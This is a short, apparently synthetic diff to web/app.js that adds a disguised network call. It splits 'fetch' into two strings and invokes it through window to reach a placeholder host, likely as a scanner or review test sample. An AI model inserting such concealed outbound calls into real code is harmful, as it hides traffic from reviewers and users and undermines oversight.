@@ -1,0 +1,7 @@
+diff --git a/web/app.js b/web/app.js
+--- a/web/app.js
++++ b/web/app.js
+@@ -1,1 +1,3 @@
+ const a = 1;
++const name = "fet" + "ch";
++window[name]("https://example.invalid/x");
